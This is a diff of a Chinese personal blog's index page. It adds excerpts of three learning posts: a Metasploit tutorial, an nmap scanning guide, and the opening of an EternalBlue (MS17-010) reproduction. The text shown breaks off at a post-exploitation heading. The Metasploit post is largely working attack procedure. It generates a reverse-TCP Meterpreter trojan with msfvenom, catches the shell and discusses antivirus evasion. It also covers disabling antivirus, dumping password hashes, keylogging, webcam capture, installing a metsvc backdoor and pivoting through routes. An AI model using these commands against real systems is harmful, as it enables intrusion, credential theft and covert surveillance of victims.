@@ -24,9 +24,9 @@
 <meta property="article:tag" content="记录,学习,分享">
 <meta name="twitter:card" content="summary">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
-    <link rel="stylesheet" href="/css/style.css?v=1681535802751">
+    <link rel="stylesheet" href="/css/style.css?v=1681885929856">
     
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681535802751">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681885929856">
 <meta name="generator" content="Hexo 5.4.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -50,7 +50,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>25</div>
+        <div><span>文章</span>28</div>
         <div><span>标签</span>2</div>
         <div><span>分类</span>0</div>
     </div>
@@ -131,6 +131,192 @@
     <div id="nexmoe-content">
         <div class="nexmoe-primary">
             <section class="nexmoe-posts">
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="Metasploit工具使用" class="lazyload">
+                    <h1>Metasploit工具使用</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月17日</a>
+            <a><i class="nexmoefont icon-areachart"></i>2.5k 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h2><p>metasploit是一款免费可下载的框架，附带数百个已知的软件漏洞，并保持频繁更新，是渗透领域最流行的框架，在kali中自带。可以使用apt-get install metasploit-framework 来更新或者使用自带的升级命令msfupdate。</p>
+<h2 id="Metasploit模块划分"><a href="#Metasploit模块划分" class="headerlink" title="Metasploit模块划分"></a>Metasploit模块划分</h2><p>msf为总模块，其他均为分支模块，分为以下几个模块：<br>辅助攻击模块：auxiliaary，扫描器，扫描主机系统，寻找可用漏洞<br>渗透攻击模块：exploits，选择配置一个漏洞利用模块<br>攻击载荷模块：payloads，选择并配置一个攻击载荷模块，主要用来建立稳定的连接，可以返回shell和进程注入<br>后渗透攻击模块：post,用于内网渗透的各种操作<br>编码器模块：encoders，选择编码技术绕过杀软或其他免杀方式<br>躲避模块：evasion是msf用来做免杀的效果一般<br>空指令模块：nops，用于提高payload稳定性和维持大小。<br>所有模块位置：/user/share/metasploit-framework/modules/<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-12-34-38.png" alt="模块位置" class="lazyload"></p>
+<h2 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h2><p>首次启动：<br>启动postgresql-&gt;启动metasploit-&gt;连接postgtesql<br>启动步骤：<br>1、启动postgresql：service postgresql start<br>2、初始化msfdb：msfdb init(默认创建的数据库名称： msf，msf_test； 用户名： msf； 密码默认值为空)<br>3、启动msf：msfconsole<br>4、使用db_status可以查看数据库连接状态<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-12-05-59.png" alt="命令执行" class="lazyload"><br>二次启动metasploit直接使用命令msfconsole启动</p>
+<h2 id="渗透步骤exploit"><a href="#渗透步骤exploit" class="headerlink" title="渗透步骤exploit"></a>渗透步骤exploit</h2><ol>
+<li>search xxx #搜索某个漏洞</li>
+<li>use xxx #使用某个漏洞利用模块</li>
+<li>show options(options) #查看配置选项，可以使用info查看详细信息</li>
+<li>set payload #配置攻击载荷</li>
+<li>exploit(run) #执行渗透攻击</li>
+</ol>
+<h2 id="常用命令参数"><a href="#常用命令参数" class="headerlink" title="常用命令参数"></a>常用命令参数</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reload_all #从目录重载所有模块，导入模块也需要使用此命令<br>back #后退命令，移除当前上下文，用于模块切换<br>info #查看模块详细信息<br>check #检查目标是否受某个漏洞影响<br><br>search type:模块类型 path:模块路径 -S 过滤 服务 <br>如：search type:auxiliary -S scanner ssh表示搜索辅助扫描模块的ssh服务<br><br><br>sessions #会话管理<br>sessions -l #列出所有会话<br>sessions -K #终止所有会话<br>sessions -i id #进入某个会话<br>sessions -v #以详细模式列出会话<br>sessions -u #在许多平台上将shell升级到meterpreter会话<br>background 或 bg #将会话放到后台<br><br>show options #显示可选选项<br>     auxiliary #显示所有辅助模块<br>     exploits #显示所有漏洞利用模块<br>     payloads #显示所有有效载荷<br>     targets #显示所有可用目标<br>     advanced #显示高级选项<br>     encoders #显示可用编码器列表<br><br>unset [moudle options] #清楚moudle options<br></code></pre></td></tr></table></figure>
+
+<p>导入模块，模块命名不能有-，可以用_代替。reload_all #从目录重载所有模块。导入模块也需要使用此命令</p>
+<h2 id="辅助模块anxiliary"><a href="#辅助模块anxiliary" class="headerlink" title="辅助模块anxiliary"></a>辅助模块anxiliary</h2><p>使用show可以展示出可以使用的扫描模块有很多<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-13-39-28.png" alt="模块" class="lazyload"><br>使用use 编号可以使用编号对应的模块<br>常用的端口扫描模块</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">use auxiliary/scanner/portmap/portmap_amp<br>use auxiliary/scanner/portscan/ftpbounce<br>use auxiliary/scanner/portscan/tcp<br>use auxiliary/scanner/portscan/ack<br>use auxiliary/scanner/portscan/syn<br>use auxiliary/scanner/portscan/xmas<br></code></pre></td></tr></table></figure>
+
+<p>常用的服务扫描</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">auxiliary/scanner/ssh/ssh_login		<span class="hljs-comment">#SSH爆破</span><br>auxiliary/scanner/vnc/vnc_none_auth	<span class="hljs-comment">#VNC空口令扫描</span><br>auxiliary/scanner/telnet/telnet_login<span class="hljs-comment">#SSH爆破</span><br>auxiliary/scanner/smb/smb_version	<span class="hljs-comment">#SMB系统版本扫描</span><br>auxiliary/scanner/smb/smb_enumusers	<span class="hljs-comment">#SMB枚举</span><br>auxiliary/scanner/smb/smb_login		<span class="hljs-comment">#SMB弱口令登录</span><br>auxiliary/admin/smb/psexec_command	<span class="hljs-comment">#登录SMB且执行命令</span><br><br>auxiliary/scanner/mssql/mssql_ping	<span class="hljs-comment">#MSSQL主机信息扫描</span><br>auxiliary/admin/mssql/mssql_enum	<span class="hljs-comment">#MSSQL枚举</span><br>auxiliary/scanner/mysql/mysql_login	<span class="hljs-comment">#MySQL弱口令扫描</span><br>auxiliary/admin/mysql/mysql_enum	<span class="hljs-comment">#MySQL枚举</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击载荷和编码（payloads-amp-amp-encoders）"><a href="#攻击载荷和编码（payloads-amp-amp-encoders）" class="headerlink" title="攻击载荷和编码（payloads &amp;&amp; encoders）"></a>攻击载荷和编码（payloads &amp;&amp; encoders）</h2><p>可以使用以下方式生成payload和编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">use payload 或标号 -E 强制编码 -e 要使用的模块编码器模块的名称 -f 输出文件名（默认stdout） -t 输出格式：raw，ruby，perl，rb，pl，c，java，dll，exe，elf，vbs，asp，war等 -b要避免的字符列表：&#x27;\x00\xff&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>常用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">windows/meterpreter/bind_tcp 		# 正向连接<br>windows/meterpreter/reverse_tcp 	# 反向连接<br>windows/meterpreter/reverse_http 	# 通过监听80端口反向连接<br>windows/meterpreter/reverse_https 	# 通过监听443端口反向连接<br></code></pre></td></tr></table></figure>
+
+<p>可以使用msfvenom生成shellcode编码免杀<br>msfvenom参数使用详解：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">-l ,--list&lt;type&gt;    #列出所有可用的项目其中值可设为payloads，encoders，nops，platforms，archs，encrypt，formats<br>-p ,--payload &lt;payload&gt;     #指定payload，如果指定为-则从标准输入流中读取<br>--list-options  #列出--payload&lt;payload&gt;的标准，高级和规避选项<br>-f  #指定输出格式 <br>--list-form #列出格式<br>-e  #指定编码方式<br>--list-encoder  #列出编码方式<br>--sec-name &lt;value&gt; #生成windows二进制文件时使用的新名称，默认四个随机数<br>--smallest #使用所有可用的编码器生成最小的payload<br>--encrypt 值 #应用于shellcode的加密或编码类型 (--list encrypt 列出)<br>--encrypt-key 值 #用于加密的密钥<br>--encrypt-iv 值 #加密初始化向量<br>-a，--arch #指定目标系统架构（--list-archs 列出）<br>--platform &lt;platform&gt; #指定目标系统平台（--list-platform）<br>-o #保存payload<br>-b,--bad-chars &lt;list&gt; #设置需要在payload中避免出现的字符<br>-n,--nopsled &lt;length&gt; #指定nop在payload中的数量<br>-s,--space &lt;length&gt; #设置未经编码的payload最大长度<br>--encoder-space &lt;length&gt; #编码后的最大长度<br>-i, --iterations &lt;count&gt; # 设置 Payload 的编码次数<br>-c, --add-code &lt;path&gt; # 指定包含一个额外的win32 shellcode文件<br>-x, --template &lt;path&gt; # 指定一个特定的可执行文件作为模板<br>-k, --keep # 保护模板程序的功能，注入的payload作为一个新的进程运行<br>-v, --var-name &lt;value&gt; # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）<br>-t, --timeout &lt;second&gt; # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）<br>-h, --help # 帮助 <br></code></pre></td></tr></table></figure>
+
+<p>windows</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kali的 ip LPORT=kali监听端口 -f exe &gt;1.exe<br>参数选项：<br>-p 指定payload<br>-a 自定系统架构<br>-e 编码器，x86/shikata_ga_nai<br>-i 迭代器，对有效载荷的编码次数<br>-f 输出文件格式：exe，dll，raw<br>-o 指定文件名输出文件<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-15-09-05.png" alt="生成" class="lazyload"></p>
+<p>linux<br><code>msfvenom -p payload LHOST=kali ip LPORT=kali监听端口 -f 文件格式&gt;文件名</code></p>
+<p>常见生成：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-51-10.png" alt="常见生成shellcode" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-52-57.png" alt="常见格式" class="lazyload"></p>
+<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>木马绕过免杀的本质是更改特征码方式有以下几种：编码、加壳免杀、二次编译、分离免杀：即将shellcode和加载器分离。目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。<br>互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。</p>
+<h2 id="监听反弹shell"><a href="#监听反弹shell" class="headerlink" title="监听反弹shell"></a>监听反弹shell</h2><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">use exploit/multi/handler 使用这个监听模块<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="hljs-comment">#注意这要和生成的木马保持一致</span><br><span class="hljs-built_in">set</span> lhost kali的ip <span class="hljs-comment">#设置本地地址要和木马一致</span><br><span class="hljs-built_in">set</span> lport 端口号 <span class="hljs-comment">#设置本地侦听端口和木马一致</span><br>run <span class="hljs-comment">#执行</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-15-23-53.png" alt="kali侦听" class="lazyload"><br>最重要的payload设置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-28-24.png" alt="设置payload" class="lazyload"><br>将生成的木马1.exe上传到win7然后执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-29-17.png" alt="运行" class="lazyload"><br>kali的msf后台上线，进入shell了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-29-58.png" alt="上线" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-33-03.png" alt="测试是否成功" class="lazyload"></p>
+<h2 id="后渗透模块（post）"><a href="#后渗透模块（post）" class="headerlink" title="后渗透模块（post）"></a>后渗透模块（post）</h2><p>以下命令是在反弹shell成功后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">run post/windows/gather/checkvm #检查目标是否虚拟机<br>run post/linux/gather/checkvm<br>run post/windows/manage/killav #关闭杀软<br>run post/windows/manage/enable_rdp #开启目标远程桌面<br>run post/windows/gather/enum_logged_on_users #列举当前登陆用户，和最近登陆过的用户<br>run post/windows/gather/enum_applications #列举应用程序<br>run windows/gather/credentials/windows_autologin#列举自动登陆的用户名和密码<br></code></pre></td></tr></table></figure>
+
+<p>运行测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-38-53.png" alt="查看" class="lazyload"></p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><strong>持久化</strong><br>刚才刚刚获得的meterpreter shell，该shell是非常脆弱的，可以把它和目标机中一个稳定的程序绑定，NT AUTHORITY\SYSTEM 这个账号是隐藏的就是windows至高权限账户，根administrator拥有相同权限：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">getpid <span class="hljs-comment">#查看当前meterpreter shell的进程号</span><br>ps <span class="hljs-comment">#获取目标进程</span><br>migrate 进程号 <span class="hljs-comment">#将shell迁移到pid为进程号的进程中</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-17-16-48-07.png" alt="持久化" class="lazyload"></p>
+<p>常用命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">pwd</span>、ls、<span class="hljs-built_in">cd</span><br>getuid		<span class="hljs-comment">#查看当前权限</span><br>getsystem	<span class="hljs-comment">#获得系统管理员权限（要本地管理员权限运行）</span><br>hashdump	<span class="hljs-comment">#抓哈希密码</span><br>sysinfo		<span class="hljs-comment">#查看系统信息</span><br>idletim     <span class="hljs-comment">#查看目标系统已运行时间</span><br>route		<span class="hljs-comment">#查看目标机完整网络设置</span><br>shell		<span class="hljs-comment">#进入目标机shell，exit退出she</span><br>background	<span class="hljs-comment">#将meterpreter隐藏在后台</span><br><br>upload ./1.txt c:\\1.txt		<span class="hljs-comment">#上传文件</span><br>download c:\1.txt ./			<span class="hljs-comment">#下载文件</span><br>search -f *.txt -d c://			<span class="hljs-comment">#搜索文件</span><br><br>keyscan_start	<span class="hljs-comment">#启动键盘记录</span><br>keyscan_stop	<span class="hljs-comment">#停止键盘记录</span><br>keyscan_dump	<span class="hljs-comment">#转储键盘记录的内容</span><br>screenshot		<span class="hljs-comment">#抓取截屏</span><br>webcam_list		<span class="hljs-comment">#摄像头列表</span><br>webcam_snap		<span class="hljs-comment">#摄像头拍照</span><br>webcam_stream	<span class="hljs-comment">#抓取视频</span><br><br><span class="hljs-comment">#Kali-Linux下登录远程桌面</span><br>sudo rdesktop -f 目标IP<br><br>route add IP 子网掩码    <span class="hljs-comment">#添加路由，先background</span><br></code></pre></td></tr></table></figure>
+
+<p>在这里可以使用persistence模块留后门,也就是建立持续性后门。<br>persistence是用来进行权限维持的，可以利用它创建注册表和文件，这个模块是我们获取了meterpreter shell后使用<br>我们可以查看persistence查看帮助信息通过<code>run persistence -h</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-12-33-32.png" alt="查看" class="lazyload"><br>这里报错暂时没有解决。</p>
+<p>也可以使用metsvc生成后门<code>run metsvc -h</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-31-15.png" alt="后门" class="lazyload"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">-A   安装后门后，自动启动exploit/multi/handler模块连接后门<br>-h  查看帮助<br>-r  删除后门<br></code></pre></td></tr></table></figure>
+
+<p>安装成功后会在c:\windows\temp中创建一个新目录上传metsvc.dll、metsvc-server.exe、metsvc.exe<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-34-00.png" alt="生成后门" class="lazyload"><br>我们打开新的msf使用handler连接，这里需要注意生成的payload已经改变我们需要重新配置为<code>set payload windows/metsvc_bind_tcp</code><br>查看配置这里我们需要指定远程地址为win7地址远程端口号为31337这里是一个正向连接的shell<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-45-02.png" alt="配置" class="lazyload"><br>执行run<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/17/Metasploit%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2023-04-18-16-52-44.png" alt="执行" class="lazyload"><br>不知什么原因死了</p>
+<h2 id="网络穿透"><a href="#网络穿透" class="headerlink" title="网络穿透"></a>网络穿透</h2><p>拿到反向shell之后获取目标网络信息<br><code>run get_local_subnets</code></p>
+<p>使用autoroute模块添加路由</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">run autoroute -s 192.168.23.0/225.225.225.0<br>run autoroute -p <span class="hljs-comment">#列出添加了路由规则存活的session</span><br></code></pre></td></tr></table></figure>
+
+<p>添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了</p>
+
+            
+        </article>
+    </div>
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="nmap扫描工具" class="lazyload">
+                    <h1>nmap扫描工具</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月16日</a>
+            <a><i class="nexmoefont icon-areachart"></i>929 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="Nmap简介"><a href="#Nmap简介" class="headerlink" title="Nmap简介"></a>Nmap简介</h2><p>端口扫描是nmap工具的核心功能，用于确定目标主机tcp/udp端口开放情况。在kali中已经安装。<br>默认情况下nmap会扫描最有可能开放的tcp端口<br>nmap通过探测将端口划分为6个状态：</p>
+<ol>
+<li>open端口是开放的</li>
+<li>closed端口是关闭的</li>
+<li>filtered端口被firewall/ids/ips屏蔽，无法确定状态</li>
+<li>unfiltered端口没有被屏蔽，但是否开放无法确定</li>
+<li>open|filtered端口是开放或屏蔽</li>
+<li>closed|filtered端口是关闭或屏蔽</li>
+</ol>
+<h2 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h2><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-11-43-45.png" alt="常用" class="lazyload"><br>nmap有四种基本功能：端口扫描、主机探测、服务识别和系统识别</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><figcaption><span>地址```默认扫描主机的1000个常用端口</span></figcaption><table><tr><td class="code"><pre><code class="hljs nmap">![扫描](nmap扫描工具/2023-04-16-11-53-56.png)<br>可以看到扫描了1000个端口并把开放的端口和能识别的服务显示出来了。<br><br>* 指定端口<br>使用-p参数可以一次扫描单个、多个、或扫描一个范围的端口<br><br>```txt<br>nmap 地址 -p 端口号 #扫描单个端口<br>nmap 地址 -p 1-80 #扫描端口范围<br>nmap 地址 -p 80,3389,23,22 #扫描多个端口<br>nmap 地址 -p- 等价于nmap 地址 -p 1-65535 #扫描全端口<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-02-37.png" alt="指定端口扫描" class="lazyload"></p>
+<ul>
+<li><p>指定扫描方式<br>利用wireshark过滤扫描时的请求包筛选出指定方式的请求例如扫描地址并且端口是tcp的80如下图<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-12-44.png" alt="指定方式扫描" class="lazyload"></p>
+</li>
+<li><p>tcp全连接扫描<br>使用-sT参数进行tcp全连接扫描（全连接扫描指的是建立完整的三次握手，能够建立则说明端口开放，否则判定端口关闭）<br><code>nmap 地址 -p 80 -sT</code><br>如果端口开放就会进行完整的三次握手成功建立连接扫描结果中的state字段为open<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-44-58.png" alt="全连接" class="lazyload"></p>
+</li>
+</ul>
+<p>如果端口关闭则只进行一次握手无法建立连接扫描结果中的state字段为closed<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-46-12.png" alt="端口关闭" class="lazyload"></p>
+<ul>
+<li>syn半连接扫描<br>使用-sS参数进行syn半连接扫描（半连接指的是只进行两次握手，对方返回确认帧ack=1说明端口开放否则端口关闭）<br><code>nmap 地址 -p 80 -sS</code><br>如果端口开放则会完成两次握手，扫描结果中的state字段为open<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-26-24.png" alt="完整扫描" class="lazyload"></li>
+</ul>
+<p>如果端口关闭则，只能进行一次握手，扫描结果state字段显示closed<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-30-25.png" alt="端口没有开放" class="lazyload"><br>这里没有进行-sS参数添加是因为nmap默认使用半连接扫描</p>
+<p>全连接和半连接<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-12-52-55.png" alt="比较" class="lazyload"></p>
+<ul>
+<li>隐秘扫描只适用于linux系统<br>隐秘扫描是向目标主机的端口发送tcp fin包或xmas tree包或null包，如果收到rst响应包则判定端口关闭否则就判定端口开放或屏蔽</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">nmap 127.0.0.1 -p 80 -sF #fin扫描<br>nmap 127.0.0.1 -p 80 -sN #null扫描所有loges都为0的tcp包<br>nmap 127.0.0.1 -p 80 -sX #xmas扫描flags的fin、urg、pysh都为1<br></code></pre></td></tr></table></figure>
+
+<h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>扫描网段中有那些主机在线，使用-sP参数，不扫描端口只扫描存活主机<br>本质上是使用ping扫描，能ping同有回包则判定主机在线<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-02-22.png" alt="扫描主机" class="lazyload"><br>可以看到扫描了192.168.23.0这个网段的256个ip其中有5个存活</p>
+<h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><p>扫描端口时，默认显示端口对应的服务，但不显示服务版本，可以使用-sV参数显示服务版本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-06-28.png" alt="显示服务版本" class="lazyload"></p>
+<h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><p>可以使用-O参数识别操作系统版本，这里扫描的结果可能不准确，识别不出来会以概率列举操作系统<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-09-05.png" alt="识别操作系统" class="lazyload"></p>
+<h3 id="扫描结果导出"><a href="#扫描结果导出" class="headerlink" title="扫描结果导出"></a>扫描结果导出</h3><p>可以导出扫描结果使用-oN导出为文本格式，-oX导出为xml格式<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/16/nmap%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/2023-04-16-13-15-41.png" alt="导出" class="lazyload"></p>
+<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>-T &lt;0-5&gt;参数指定扫描速度，常用4</p>
+
+            
+        </article>
+    </div>
+    
+    <div class="nexmoe-post">
+        <a href="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/">
+            
+                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
+                    <img data-src="/assets/background.gif" data-sizes="auto" alt="永恒之蓝漏洞复现（ms17-010）" class="lazyload">
+                    <h1>永恒之蓝漏洞复现（ms17-010）</h1>
+                </div>
+            
+        </a>
+
+        <div class="nexmoe-post-meta nexmoe-rainbow">
+            <a><i class="nexmoefont icon-calendar-fill"></i>2023年04月15日</a>
+            <a><i class="nexmoefont icon-areachart"></i>875 字</a>
+            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+        </div>
+
+        <article>
+            
+                <h2 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h2><p>metasploit framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知软件漏洞，并保持持续更新，metaspolit可以用来信息搜集、漏洞探测、漏洞利用等渗透测试的全流程，在kali中自带了。</p>
+<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>基础命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">进入msf</span><br>msfconsole<br><span class="hljs-meta">#</span><span class="bash">使用search查找相关漏洞</span><br>search ms17-010<br><span class="hljs-meta">#</span><span class="bash">使用use进入模块</span><br>use 数字<br><span class="hljs-meta">#</span><span class="bash">使用info查看模块xinxi</span><br>info<br><span class="hljs-meta">#</span><span class="bash">设置poc连接方式</span><br>set payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-meta">#</span><span class="bash">查看模块需要配置的参数</span><br>show options<br><span class="hljs-meta">#</span><span class="bash">设置参数</span><br>set RHOST 地址<br><span class="hljs-meta">#</span><span class="bash">攻击</span><br>exploit / run<br><span class="hljs-meta">#</span><span class="bash">回退</span><br>back<br><br></code></pre></td></tr></table></figure>
+
+<p>后渗透命令</p>
